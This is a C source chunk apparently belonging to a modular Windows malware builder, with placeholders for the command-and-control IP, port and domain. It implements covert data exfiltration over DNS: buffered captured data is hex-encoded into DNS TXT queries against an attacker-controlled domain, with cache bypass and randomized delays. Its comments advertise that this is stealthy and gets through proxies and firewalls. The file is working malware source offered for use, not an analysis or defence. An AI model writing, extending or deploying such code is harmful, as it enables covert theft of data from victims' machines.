// chunk: exfil/dns_flush
// depends: core/emit_buffer
// provides: exfiltrate, flush_to_c2
// headers: winsock2.h, ws2tcpip.h, windns.h
// libs: ws2_32, dnsapi
// note: DNS TXT query exfil — extremely stealthy, works through proxies/firewalls

#ifndef CHUNK_DNS_FLUSH
#define CHUNK_DNS_FLUSH

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windns.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}
#define DNS_EXFIL_DOMAIN "{{DNS_DOMAIN}}"
#define DNS_CHUNK_BYTES 30

static void bytes_to_hex(const BYTE *in, int n, char *out) {
    const char *hex = "0123456789abcdef";
    for (int i = 0; i < n; i++) {
        out[i*2]   = hex[in[i] >> 4];
        out[i*2+1] = hex[in[i] & 0xf];
    }
    out[n*2] = '\0';
}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    (void)ip; (void)port;
    if (!data || len == 0) return FALSE;
    DWORD offset = 0;
    int seq = 0;
    while (offset < len) {
        int chunk = (len - offset > DNS_CHUNK_BYTES) ? DNS_CHUNK_BYTES : (int)(len - offset);
        char hex[DNS_CHUNK_BYTES * 2 + 1];
        bytes_to_hex((const BYTE *)data + offset, chunk, hex);

        char query[256];
        snprintf(query, sizeof(query), "%04x.%s.%s", seq, hex, DNS_EXFIL_DOMAIN);

        PDNS_RECORD pRec = NULL;
        DnsQuery_A(query, DNS_TYPE_TEXT, DNS_QUERY_STANDARD | DNS_QUERY_BYPASS_CACHE,
                   NULL, &pRec, NULL);
        if (pRec) DnsRecordListFree(pRec, DnsFreeRecordList);

        offset += chunk;
        seq++;
        Sleep(50 + (GetTickCount() % 100));
    }
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
